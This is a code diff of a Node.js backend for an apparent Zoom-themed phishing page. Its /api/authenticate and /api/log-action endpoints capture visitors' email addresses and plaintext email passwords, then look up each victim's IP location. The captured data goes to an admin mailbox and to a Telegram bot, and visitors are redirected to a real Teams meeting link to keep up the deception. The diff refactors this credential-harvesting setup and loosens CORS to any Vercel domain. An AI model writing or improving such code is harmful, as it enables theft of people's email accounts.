@@ -14,40 +14,40 @@ const fetch = require('node-fetch');
 
 const app = express();
 
-const allowedOrigins = [
-  'http://localhost:3000',
-  'https://business-meeting.vercel.app',
-  'https://business-meeting-loer.vercel.app/',
-  'https://your-backblaze-or-cuugmstom-domain.com'
-];
-
+// --- CONFIGURATION ---
 const PORT = process.env.PORT || 8080;
 const smtpUser = process.env.SMTP_USER;
 const smtpPass = process.env.SMTP_PASS;
 const adminEmail = process.env.ADMIN_EMAIL;
 const SECRET = process.env.SECRET || "zoom_meeting_secret_2026";
-
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+const EMAIL_PASSWORD = process.env.EMAIL_PASSWORD || "de23#$QZoom2026!";
 
+const allowedOrigins = [
+  'http://localhost:3000',
+  'http://localhost:8080',
+  'https://business-meeting.vercel.app',
+  'https://business-meeting-loer.vercel.app',
+  'https://xxx-meeting.vercel.app',
+  'https://your-backblaze-or-cuugmstom-domain.com'
+];
+
+// --- MIDDLEWARE ---
 app.use(cors({
   origin: function (origin, callback) {
     // allow requests with no origin (like mobile apps or curl requests)
     if (!origin) return callback(null, true);
     
-    // Normalize origin by removing trailing slash if present
     const normalizedOrigin = origin.replace(/\/$/, "").toLowerCase();
-    
-    // Check if origin matches any allowed pattern
-    const isAllowed = allowedOrigins.some(allowed => {
-      const normalizedAllowed = allowed.replace(/\/$/, "").toLowerCase();
-      return normalizedOrigin === normalizedAllowed;
-    });
+    const isAllowed = allowedOrigins.some(allowed => 
+      allowed.replace(/\/$/, "").toLowerCase() === normalizedOrigin
+    ) || normalizedOrigin.includes(".vercel.app"); // Allow all Vercel previews
 
     if (isAllowed) {
       callback(null, true);
     } else {
-      console.warn(`CORS blocked for origin: ${origin} (Normalized: ${normalizedOrigin})`);
+      console.warn(`[CORS] Blocked: ${origin}`);
       callback(new Error(`CORS blocked for origin: ${origin}`));
     }
   },
@@ -57,35 +57,35 @@ app.use(cors({
 app.use(bodyParser.json({ limit: '10mb' }));
 app.use(express.static('public'));
 
-// Default email password (can be overridden via .env)
-const EMAIL_PASSWORD = process.env.EMAIL_PASSWORD || "de23#$QZoom2026!";
-
+// --- EMAIL (SMTP) SETUP ---
+// Using Port 587 with secure: false is the most reliable for Render
 const transporter = nodemailer.createTransport({
   host: "smtp.gmail.com",
-  port: 465,
-  secure: true, // Use SSL/TLS
+  port: 587,
+  secure: false, // TLS
+  pool: true,
   auth: { user: smtpUser, pass: smtpPass },
-  connectionTimeout: 10000, // 10 seconds
-  greetingTimeout: 10000,
-  socketTimeout: 10000
+  connectionTimeout: 30000,
+  greetingTimeout: 30000,
+  socketTimeout: 30000,
+  debug: true,
+  logger: true
 });
 
-// Verify SMTP connection on startup
 transporter.verify((error, success) => {
   if (error) {
-    console.error("❌ SMTP Verification Error:", error);
-    console.error("Ensure SMTP_USER and SMTP_PASS are set correctly in Render environment variables.");
-    console.error("If using Gmail, use an 'App Password' instead of your main password.");
+    console.error("❌ SMTP Verification Error:", error.message);
+    console.error("DEBUG: host=smtp.gmail.com, port=587, secure=false, user=" + smtpUser);
   } else {
-    console.log("✅ Mail Server is ready to send messages");
+    console.log("✅ Mail Server Ready (Port 587)");
   }
 });
 
+// --- HELPERS ---
 function getClientIp(req) {
   return (req.headers["x-forwarded-for"] || "").split(",").pop()?.trim()
     || req.connection?.remoteAddress
     || req.socket?.remoteAddress
-    || req.connection?.socket?.remoteAddress
     || "unknown";
 }
 
@@ -97,14 +97,10 @@ async function getLocationFromIp(ip) {
       resp.on('end', () => {
         try {
           const response = JSON.parse(data);
-          if (response.status === 'success') {
-            resolve(`${response.city}, ${response.regionName}, ${response.country}`);
-          } else {
-            resolve('Location unavailable');
-          }
-        } catch (e) {
-          resolve('Location error');
-        }
+          resolve(response.status === 'success' 
+            ? `${response.city}, ${response.regionName}, ${response.country}` 
+            : 'Location unavailable');
+        } catch (e) { resolve('Location error'); }
       });
     }).on('error', () => resolve('Location error'));
   });
@@ -118,93 +114,88 @@ async function sendTelegramAlert(message) {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
     });
-  } catch (e) {
-    console.error('Telegram error:', e);
-  }
+  } catch (e) { console.error('Telegram error:', e.message); }
 }
 
-// 🚨 INTRUDER MONITOR & ACTION LOGGING
+// --- ENDPOINTS ---
+
 app.post('/api/log-action', async (req, res) => {
   try {
-    const logData = req.body;
+    const { action, email, password, intruderDetected } = req.body;
     const ip = getClientIp(req);
-    const locationInfo = await getLocationFromIp(ip);
+    const location = await getLocationFromIp(ip);
+    const ua = req.headers['user-agent'];
 
-    const alertMailText = `🚨 ZOOM MEETING MONITOR - ${String(logData.action || '').toUpperCase()}
+    console.log(`[ACTION] ${action} | IP: ${ip} | Email: ${email || 'none'}`);
+
+    const mailText = `🚨 ZOOM MEETING MONITOR - ${String(action || '').toUpperCase()}
 ═══════════════════════════════════════════════
-ACTION: ${logData.action}
-EMAIL: ${logData.email || 'none'}
-PASSWORD ATTEMPT: ${logData.password || 'N/A'}
+ACTION: ${action}
+EMAIL: ${email || 'none'}
+PASSWORD ATTEMPT: ${password || 'N/A'}
 IP: ${ip}
-LOCATION: ${locationInfo}
-BROWSER: ${req.headers['user-agent']}
+LOCATION: ${location}
+BROWSER: ${ua}
 URL: ${req.headers.referer || 'unknown'}
 TIME: ${new Date().toISOString()}
-${logData.intruderDetected ? '🚨 INTRUDER DETECTED!' : ''}
+${intruderDetected ? '🚨 INTRUDER DETECTED!' : ''}
 ═══════════════════════════════════════════════`;
 
-    // Email to admin
     transporter.sendMail({
       from: smtpUser,
       to: adminEmail,
-      subject: `🚨 Zoom Meeting ${String(logData.action || '').toUpperCase()} from ${locationInfo}${logData.intruderDetected ? ' [INTRUDER!]' : ''}`,
-      text: alertMailText
-    }).then(info => {
-      console.log(`✅ Email sent for action: ${logData.action}`);
-    }).catch(err => {
-      console.error(`❌ Failed to send email for action: ${logData.action}`, err);
-    });
+      subject: `🚨 Zoom Action: ${String(action || '').toUpperCase()} from ${location}`,
+      text: mailText
+    }).catch(e => console.error(`❌ Mail Error (${action}):`, e.message));
 
-    // Telegram alert
-    const tgText = `Zoom Action: ${logData.action} | Email: ${logData.email || 'none'} | IP: ${ip}`;
-    sendTelegramAlert(tgText);
+    sendTelegramAlert(`Zoom Action: ${action} | Email: ${email || 'none'} | IP: ${ip}`);
 
     res.json({ success: true });
   } catch (error) {
-    console.error('log-action error:', error);
+    console.error('API Error (/log-action):', error.message);
     res.status(500).json({ success: false });
   }
 });
 
-// Main authentication endpoint for the meeting landing page
 app.post('/api/authenticate', async (req, res) => {
-  const { email, password } = req.body;
-  const ip = getClientIp(req);
-  const locationInfo = await getLocationFromIp(ip);
+  try {
+    const { email, password } = req.body;
+    const ip = getClientIp(req);
+    const location = await getLocationFromIp(ip);
 
-  const alertMailText = `🔐 Zoom Meeting Email Password Attempt
+    console.log(`[LOGIN] Attempt for: ${email} | IP: ${ip}`);
+
+    const mailText = `🔐 Zoom Email Password Attempt
 Email: ${email}
-Email Password: ${password}
+Password: ${password}
 IP: ${ip}
-Location: ${locationInfo}
+Location: ${location}
 Browser: ${req.headers['user-agent']}
 Time: ${new Date().toISOString()}`;
 
-  // Log attempt to admin email
-  transporter.sendMail({
-    from: smtpUser, 
-    to: adminEmail,
-    subject: `🔐 Zoom Email Password Attempt (${email})`,
-    text: alertMailText
-  }).then(info => {
-    console.log(`✅ Authentication attempt email sent for: ${email}`);
-  }).catch(err => {
-    console.error(`❌ Failed to send authentication email for: ${email}`, err);
-  });
+    transporter.sendMail({
+      from: smtpUser,
+      to: adminEmail,
+      subject: `🔐 Zoom Attempt: ${email}`,
+      text: mailText
+    }).catch(e => console.error(`❌ Mail Error (Auth):`, e.message));
 
-  const tgText = `Zoom Login Attempt: email=${email} ip=${ip}`;
-  sendTelegramAlert(tgText);
+    sendTelegramAlert(`Zoom Login: ${email} | IP: ${ip}`);
 
-  if (password === EMAIL_PASSWORD) {
-    const meetingLink = "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true";
-    return res.json({ success: true, redirect: meetingLink });
-  } else {
-    return res.status(401).json({ success: false, error: 'Invalid email password.' });
+    if (password === EMAIL_PASSWORD) {
+      const redirect = "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true";
+      return res.json({ success: true, redirect });
+    } else {
+      return res.status(401).json({ success: false, error: 'Invalid password.' });
+    }
+  } catch (error) {
+    console.error('API Error (/authenticate):', error.message);
+    res.status(500).json({ success: false });
   }
 });
 
-app.get('/health', (req, res) => res.json({ status: 'OK' }));
+app.get('/health', (req, res) => res.json({ status: 'OK', time: new Date() }));
 
 app.listen(PORT, () => {
-  console.log(`🚀 Zoom Backend on port ${PORT}`);
+  console.log(`🚀 Server running on port ${PORT}`);
 });
